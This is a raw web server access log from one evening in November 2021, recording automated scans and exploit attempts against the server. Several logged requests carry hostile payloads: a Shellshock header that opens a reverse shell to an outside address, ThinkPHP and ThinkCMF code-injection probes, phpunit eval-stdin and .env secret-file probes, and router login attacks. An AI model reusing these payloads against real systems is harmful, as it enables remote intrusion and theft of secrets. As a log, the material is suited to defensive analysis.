195.133.18.118 - - [27/Nov/2021:18:36:13 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:18:36:14 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:18:39:19 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:18:39:20 +0000] "" 400 0 "-" "-"
218.248.240.131 - - [27/Nov/2021:18:44:31 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
218.248.240.131 - - [27/Nov/2021:18:44:31 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
195.133.18.118 - - [27/Nov/2021:18:48:46 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:18:48:47 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:18:54:40 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:18:54:41 +0000] "" 400 0 "-" "-"
144.91.126.15 - - [27/Nov/2021:18:59:02 +0000] "POST / HTTP/1.1" 200 943 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
144.91.126.15 - - [27/Nov/2021:18:59:04 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
195.133.18.118 - - [27/Nov/2021:19:02:39 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:19:02:40 +0000] "" 400 0 "-" "-"
66.240.205.34 - - [27/Nov/2021:19:03:18 +0000] "Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&\xA7*\x04$&g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4'J\x97\xA9\x82\xE30\xC3\x91h]&\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]" 400 166 "-" "-"
138.118.235.133 - - [27/Nov/2021:19:03:58 +0000] "GET / HTTP/1.1" 400 166 "-" "-"
195.133.18.118 - - [27/Nov/2021:19:06:38 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:19:06:39 +0000] "" 400 0 "-" "-"
212.193.30.105 - - [27/Nov/2021:19:10:50 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
212.193.30.105 - - [27/Nov/2021:19:10:51 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:19:14:07 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:19:14:08 +0000] "" 400 0 "-" "-"
45.146.164.110 - - [27/Nov/2021:19:14:35 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.133.18.118 - - [27/Nov/2021:19:20:54 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:19:20:55 +0000] "" 400 0 "-" "-"
160.116.22.17 - - [27/Nov/2021:19:27:59 +0000] "GET / HTTP/1.1" 200 72 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
160.116.22.17 - - [27/Nov/2021:19:28:00 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xCCX\x9E\x91G\x08d\xE8t\xF7\x97`\xA5;\x15\xBD\x03\x7F\xB9\x0C\x0E\xC2W\xE9\xD4\xB2\x12Q\x13\xB2zm  \xB8\xBD\xD94$\x93\xB1\xC5\x0F\x10\xA1P1\x1AcI?\x16\xB5\x06\x13F\x9Ek\x11j\x1A\x8CA\xA0\xFA\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 166 "-" "-"
160.116.22.17 - - [27/Nov/2021:19:28:01 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xAB\xAB,^*8R\xDB+\x8D\x8C\x13\x0BT\x02\xCB\xCE\xA03\xDAW\x8D\xD7\x9D\x92\xDA\xAF\x90o\x8B\x83+ \x14\xCCeg%\x93\xD8Fk\xAF/l\x01}&x\xA6\xE1U>Iy\xAF\xE0\x05\xCA\x17\xBC2\xBE\x92\x9C\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 166 "-" "-"
160.116.22.17 - - [27/Nov/2021:19:28:01 +0000] "\x5Cx01\x5Cx00\x5Cx00\x5Cx00 \x5Cxbf\x5Cx02\x5Cx00\x5Cx88\x5Cx13\x5Cx00\x5Cx00\x5Cx87\x5Cx00\x5Cx00\x5Cx00NIMABIJIAN\x5Cx04\x5Cx03\x5Cx00\x5Cx00{\x5Cx99Caig\x5Cx9c\x5Cx03\x5Cxc7eB\x5Cxc5\x5Ct\x5Cxc1\x5Cx18a\x5Cx11\x5Cx1a\x5Cx91\x5Cx1f\x5Cx02\x5Ctcof\x5Cx91\x5Cxc0\x5Cx80sJ5\x5Cxd2\x5Cx80\x5Cxe6\x5Cx9a~\x5Cxb9\x5Cxc7\x5Cx83^\x5Cx96\x5CxeeN\x5Cx16\x5Cx96\x5Cx96&\x5Cxe6\x5Cx03\x5Cxea\x5Cxbc\x5Cx81\x5Cx02=\x5Cxac\x5Cx10\x5Cxfa?7\x5Cx03\x5Cxc3\x5Cxdf\x5Cxf7\x5Cxe4\x5Cx98`p\x5Cxe6\x5Cx8d\x5Cxc1\x5Cxa9\x5Cx8d\x5Cxc6\x5Cx06\x5Cxdb\x5Cxaf\x5Cx91\x5Cxe7\x5Cx82s\x5Cxf7\x5Cx14H\x5Cxd4\x5Cxe1W\x5Cx9a\x5Cx93C\x5Cx9e]\x5Cxa4\x5Cx01#\x5Cx03#\x5Cx03]\x5Cx03c]CC\x5Cx05C\x5Cx03+S\x5Cx03b\x5Cxf4\x5Cx00\x5Cx00/\x5Cx9e\x5Cx16E" 400 166 "-" "-"
160.116.22.17 - - [27/Nov/2021:19:28:01 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
160.116.22.17 - - [27/Nov/2021:19:28:04 +0000] "GET /robots.txt HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
160.116.22.17 - - [27/Nov/2021:19:28:04 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
109.237.103.38 - - [27/Nov/2021:19:28:04 +0000] "GET /.env HTTP/1.1" 400 666 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.38 - - [27/Nov/2021:19:28:05 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
195.133.18.118 - - [27/Nov/2021:19:28:51 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:19:28:52 +0000] "" 400 0 "-" "-"
103.79.142.141 - - [27/Nov/2021:19:33:14 +0000] "POST /GponForm/diag_Form?style/ HTTP/1.1" 404 196 "-" "curl/7.3.2"
218.248.240.131 - - [27/Nov/2021:19:36:23 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
218.248.240.131 - - [27/Nov/2021:19:36:23 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
192.241.209.65 - - [27/Nov/2021:19:36:31 +0000] "GET /owa/auth/logon.aspx HTTP/1.1" 404 183 "-" "Mozilla/5.0 zgrab/0.x"
180.149.125.163 - - [27/Nov/2021:19:38:00 +0000] "GET /c/ HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
192.241.212.44 - - [27/Nov/2021:19:39:22 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 183 "-" "Mozilla/5.0 zgrab/0.x"
195.133.18.118 - - [27/Nov/2021:19:39:31 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:19:39:31 +0000] "" 400 0 "-" "-"
192.241.208.61 - - [27/Nov/2021:19:40:58 +0000] "GET /owa/auth/x.js HTTP/1.1" 404 183 "-" "Mozilla/5.0 zgrab/0.x"
218.248.240.131 - - [27/Nov/2021:19:44:17 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
45.146.164.110 - - [27/Nov/2021:19:47:18 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.133.18.118 - - [27/Nov/2021:19:47:52 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:19:47:52 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:19:54:26 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:19:54:26 +0000] "" 400 0 "-" "-"
213.180.203.94 - - [27/Nov/2021:19:57:32 +0000] "GET /robots.txt HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
95.108.213.63 - - [27/Nov/2021:19:57:33 +0000] "GET /robots.txt HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
87.250.224.11 - - [27/Nov/2021:19:57:36 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
5.45.207.131 - - [27/Nov/2021:19:57:40 +0000] "GET /robots.txt HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
5.255.253.121 - - [27/Nov/2021:19:57:44 +0000] "GET / HTTP/1.1" 200 943 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
5.255.253.132 - - [27/Nov/2021:19:59:08 +0000] "GET / HTTP/1.1" 200 943 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
45.146.164.110 - - [27/Nov/2021:19:59:16 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
139.162.145.250 - - [27/Nov/2021:20:00:04 +0000] "GET /bag2 HTTP/1.1" 400 666 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
195.133.18.118 - - [27/Nov/2021:20:00:45 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:20:00:46 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:20:07:35 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:20:07:35 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:20:12:44 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:20:12:44 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:20:21:13 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:20:21:13 +0000] "" 400 0 "-" "-"
185.220.101.140 - - [27/Nov/2021:20:26:55 +0000] "GET / HTTP/1.1" 200 943 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
62.102.148.68 - - [27/Nov/2021:20:26:58 +0000] "GET /favicon.ico HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
195.133.18.118 - - [27/Nov/2021:20:26:58 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:20:26:59 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:20:35:51 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
160.116.22.17 - - [27/Nov/2021:20:35:51 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03O\x9E\xBEZr\xE2\x96Kd3\xCC\xFB\x08\xCA5|i\xD2\x89\xCC\x8A\xB0\x88\xE7R)\xD4\x94r\xD9E  \x89Tu\x8B" 400 166 "-" "-"
195.133.18.118 - - [27/Nov/2021:20:35:51 +0000] "" 400 0 "-" "-"
160.116.22.17 - - [27/Nov/2021:20:35:51 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xAB\x171\xB1%n\x88I\xEE\x1E\xEA\xBF3Y\x00\xE4\x89f\xD3\x10\xE2\xA2\x19\xCA\xDF\xA3\xBB8H\x1F\xCB% \x05\x86`T\xAE\xD9;BM\xF2G6\xFE\xF0\x19?a\xD3n\xDD\xAF\xDC\xA5\xBDz\x99\xBA\xC1]\xFD\xD6\xA8\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 166 "-" "-"
218.248.240.131 - - [27/Nov/2021:20:36:14 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
218.248.240.131 - - [27/Nov/2021:20:36:14 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
160.116.22.17 - - [27/Nov/2021:20:36:21 +0000] "\x16\x03\x03\x01\xA5\x01\x00\x01\xA1\x03\x03\x01#\xCA\xCC\xB7\x05\xB7q\xEB\x00`\xB6w@\xB4\xE2^\xD8\xB4\x1E\xBFzg\x1B!~L\xED\x7F!I: \x92\xEF\xE0\xA9\xF7\xBAkG\xFC\x0E\x5C*Lt\xD5u.v\x12\xEB\xDBN\xA7Hn&?\x94]\xA5\xE8\xCD\x00\x8A\x00\x16\x003\x00g\xC0\x9E\xC0\xA2\x00\x9E\x009\x00k\xC0\x9F\xC0\xA3\x00\x9F\x00E\x00\xBE\x00\x88\x00\xC4\x00\x9A\xC0\x08\xC0\x09\xC0#\xC0\xAC\xC0\xAE\xC0+\xC0" 400 166 "-" "-"
160.116.22.17 - - [27/Nov/2021:20:36:21 +0000] "\x16\x03\x03\x01\xA5\x01\x00\x01\xA1\x03\x03s\x9BE\xF6\x8C\x88\xA5\x98\x16\xD2\x8E\xD4R\x05\xC7\xB0N^+\xE8\xA3\xB9{\xC2\x95\xC8\x10\xD8\xAF\xAB;\xCA \xA4\x96caR&F\xF4\xE0D\xEF\x18S\xEBW\xAF\x92W\xEA\xBE\x9C\x7F\x9D\xD3\x5Ca\x9A\x86%\x8C\x88n\x00\x8A\x00\x05\x00\x04\x00\x07\x00\xC0\x00\x84\x00\xBA\x00A\x00\x9D\xC0\xA1\xC0\x9D\x00=\x005\x00\x9C\xC0\xA0\xC0\x9C\x00<\x00/\x00" 400 166 "-" "-"
160.116.22.17 - - [27/Nov/2021:20:36:21 +0000] "\x16\x03\x03\x01V\x01\x00\x01R\x03\x03\xA0\x88\x16RX\x86\x0C\x84\xD1\x89|\xB0A^\xB6S\xF9u\x85\xDC\x9Fbk\xE7\xCA\xFA\x90\xBFF\x0E\x9F\xDA \x1096\x8C\xD4p\x9AF]\xE3\xE4\xDD\xC2\x11`C\xC0R\xB4\xCC\xA0\x0C_5n|\xAAH\xC2\xDE\xA6\xC7\x00F\xC0\x12\xC0\x07\xCC\x14\x13\x01\x13\x02\xCC\xA9\xC0s\xC0r\xC0,\xC0\xAF\xC0\xAD\xC0$\xC0" 400 166 "-" "-"
160.116.22.17 - - [27/Nov/2021:20:36:22 +0000] "\x16\x03\x03\x01H\x01\x00\x01D\x03\x03\x05\x1D<~" 400 166 "-" "-"
160.116.22.17 - - [27/Nov/2021:20:36:22 +0000] "\x16\x03\x03\x01\x99\x01\x00\x01\x95\x03\x03I4\x84\x8D\xCA\x8D\xBDK>=\x84/\xD7C\xAA\xD9i\xFC\xA6\xBE\xEA\xE5\x1B\xC3\xDE\xDD\xA9\x13\x0C[\x0F\xBA \x05\xADD\xEA\x13y\xC8@\xBD?*\x12\xFE\xC44\xCE\x8E?ww\x19/\x93\xD6\x90\xC0\xB3,\x03\x0Ct\xB8\x00\x8C" 400 166 "-" "-"
160.116.22.17 - - [27/Nov/2021:20:36:22 +0000] "\x16\x03\x02\x01\x9A\x01\x00\x01\x96\x03\x027\xDA\x9EJ'B\xDB\x99\x02\x05-\xDD;\x90\xEB\x9B\xFC\xBA\xA2iJ\xBF\xE0\xB4UL\x11Fr\x1E\x5Cj \xD1yj-\x93\x8C2\xB5j8\xE8\xF3\xE2B\x8E\x9E\xF6\xAA.!c\xC8\x0B\xDE\xBB\xE0.\xF4d\xB6\xB4\xEA\x00\x8A\x00\x16\x003\x00g\xC0\x9E\xC0\xA2\x00\x9E\x009\x00k\xC0\x9F\xC0\xA3\x00\x9F\x00E\x00\xBE\x00\x88\x00\xC4\x00\x9A\xC0\x08\xC0\x09\xC0#\xC0\xAC\xC0\xAE\xC0+\xC0" 400 166 "-" "-"
160.116.22.17 - - [27/Nov/2021:20:36:22 +0000] "\x16\x03\x01\x01\xA7\x01\x00\x01\xA3\x03\x03\x04\x90\x09\x07\x8D\xEA\x8DGF\x02\x8E\x13\xA1H{|\xA6\xB7\x16G\xE02\xD7\xAC\xDFz'\xC9\x93\xB2\x03\xDE J\x03\xB5\xDB\xDF\x8D\xEE\x83\x8EeI\xA2\xC7\x8D\xB5&%q\x08\xF2\xAAc\x22\xDEx;\xF0V3\xE4\xF9k\x00\x8A\x00\x16\x003\x00g\xC0\x9E\xC0\xA2\x00\x9E\x009\x00k\xC0\x9F\xC0\xA3\x00\x9F\x00E\x00\xBE\x00\x88\x00\xC4\x00\x9A\xC0\x08\xC0\x09\xC0#\xC0\xAC\xC0\xAE\xC0+\xC0" 400 166 "-" "-"
160.116.22.17 - - [27/Nov/2021:20:36:23 +0000] "\x16\x03\x01\x01\xA7\x01\x00\x01\xA3\x03\x03\xFCW\x07\xE0[\x9B\xA9\xFC\x1F3z`\xC4\xA6\x87\xEB\x97(\xAF\xCF\x19P\xD5r\xF6Xg\x8A\x07N\x06\x07 F" 400 166 "-" "-"
160.116.22.17 - - [27/Nov/2021:20:36:23 +0000] "\x16\x03\x01\x01\x9D\x01\x00\x01\x99\x03\x03\x98\xBEM\xD2\xCC\xBD\x94\xFE\x80Os\x22\xD67t\xA0[g\x8D\xE8\xEFQ\xD1\x1DI\xD4\xD2\x86\xB8\xB7>\xEA ,\x84\x9C\xAC\x08t4\x9F s\x18\xF5+vd\xF6\x96\xEFpL\xD8\x03R!\x16v\xFB\x09`\x13\xEA\x81\x00\x80\x00\x16\x003\x00g\xC0\x9E\xC0\xA2\x00\x9E\x009\x00k\xC0\x9F\xC0\xA3\x00\x9F\x00E\x00\xBE\x00\x88\x00\xC4\x00\x9A\xC0\x08\xC0\x09\xC0#\xC0\xAC\xC0\xAE\xC0+\xC0" 400 166 "-" "-"
160.116.22.17 - - [27/Nov/2021:20:36:23 +0000] "\x16\x03\x01\x01\xB4\x01\x00\x01\xB0\x03\x03L\xC4-\xB8-\x0C\xB2\xB6Md\x18\x1Cx\xE6\xCAU\x91\x9E^\xFCF\x9E,\x90\x03\xB80\x8AmD\xB4\x99 #\xE0_G\x90\x92b\x11)\xE9\xE8\xD6\x80}\xAF\xAB\xAAi}n\xBC\xC2@Uf\xA8\xFEF\x05,\xDE\x8E\x00\x8C\xEA\xEA\xC0\x12\xC0\x13\xC0\x07\xC0'\xCC\x14\xC0/\x13\x01\xC0\x14\x13\x02\xC0(\xCC\xA9\xC00\xC0s\xC0`\xC0r\xC0a\xC0,\xC0v\xC0\xAF\xC0w\xC0\xAD\xCC\xA8\xC0$\x13\x05\xC0" 400 166 "-" "-"
195.133.18.118 - - [27/Nov/2021:20:41:24 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:20:41:25 +0000] "" 400 0 "-" "-"
45.146.164.110 - - [27/Nov/2021:20:41:48 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 72 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
218.248.240.131 - - [27/Nov/2021:20:44:06 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
195.133.18.118 - - [27/Nov/2021:20:47:03 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:20:47:03 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:20:52:46 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:20:52:46 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:21:02:15 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:21:02:16 +0000] "" 400 0 "-" "-"
45.146.164.110 - - [27/Nov/2021:21:04:49 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 72 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
47.253.82.78 - - [27/Nov/2021:21:05:58 +0000] "GET /cgi-bin/index.cgi HTTP/1.0" 404 162 "-" "() { :; }; /bin/bash -i >& /dev/tcp/202.61.199.103/15347 0<&1 2>&1"
195.133.18.118 - - [27/Nov/2021:21:06:21 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:21:06:21 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:21:14:20 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:21:14:21 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:21:20:00 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:21:20:00 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:21:27:22 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:21:27:22 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [27/Nov/2021:21:34:20 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:21:34:20 +0000] "" 400 0 "-" "-"
98.143.211.231 - - [27/Nov/2021:21:35:14 +0000] "GET / HTTP/1.1" 200 41 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
218.248.240.131 - - [27/Nov/2021:21:36:06 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
195.133.18.118 - - [27/Nov/2021:21:39:12 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:21:39:12 +0000] "" 400 0 "-" "-"
218.248.240.131 - - [27/Nov/2021:21:43:49 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
218.248.240.131 - - [27/Nov/2021:21:43:49 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
195.133.18.118 - - [27/Nov/2021:21:46:10 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [27/Nov/2021:21:46:10 +0000] "" 400 0 "-" "-"
